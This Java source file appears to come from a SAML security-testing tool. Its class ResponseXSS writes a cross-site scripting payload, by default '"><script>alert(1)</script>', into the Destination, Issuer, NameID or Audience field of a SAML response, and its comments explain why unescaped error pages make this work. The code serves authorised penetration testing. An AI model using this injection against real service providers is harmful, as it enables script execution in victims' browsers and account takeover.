package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Injects an XSS payload into a SAML field that may be reflected in an SP
/// error page before signature verification runs.
///
/// When an SP encounters an invalid SAML response it often renders human-readable
/// error pages that echo attacker-controlled values — Destination, Issuer, NameID,
/// or Audience — without HTML escaping. Because this reflection happens during
/// parsing and not after signature validation, the payload does not need to come
/// from a signed response.
///
/// The helper writes the payload verbatim through DOM APIs, so the serializer
/// handles any XML escaping needed to keep the document well-formed. The SP's
/// own (un-)escaping is what determines whether the injection becomes HTML.
///
/// Reference: https://agrrrdog.blogspot.com/2023/01/testing-saml-security-with-dast.html
public class ResponseXSS {

    public enum Target {
        DESTINATION("Destination attribute on <Response>"),
        ISSUER("Text content of <Issuer>"),
        NAMEID("Text content of <NameID>"),
        AUDIENCE("Text content of <Audience>");

        private final String label;
        Target(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    public static final String DEFAULT_PAYLOAD = "\"><script>alert(1)</script>";

    public static String apply(String samlMessage, Target target, String payload)
            throws SAXException, IOException {
        if (payload == null) {
            throw new IllegalArgumentException("payload must not be null");
        }
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        switch (target) {
            case DESTINATION -> injectDestination(document, payload);
            case ISSUER     -> injectTextContent(document, "Issuer", payload);
            case NAMEID     -> injectTextContent(document, "NameID", payload);
            case AUDIENCE   -> injectTextContent(document, "Audience", payload);
        }

        return xmlHelpers.getString(document);
    }

    private static void injectDestination(Document document, String payload) {
        NodeList responses = document.getElementsByTagNameNS("*", "Response");
        if (responses.getLength() == 0) {
            throw new IllegalArgumentException("No Response element found in SAML message.");
        }
        ((Element) responses.item(0)).setAttribute("Destination", payload);
    }

    private static void injectTextContent(Document document, String localName, String payload) {
        NodeList nodes = document.getElementsByTagNameNS("*", localName);
        if (nodes.getLength() == 0) {
            throw new IllegalArgumentException("No " + localName + " element found in SAML message.");
        }
        nodes.item(0).setTextContent(payload);
    }

    private ResponseXSS() {}
}
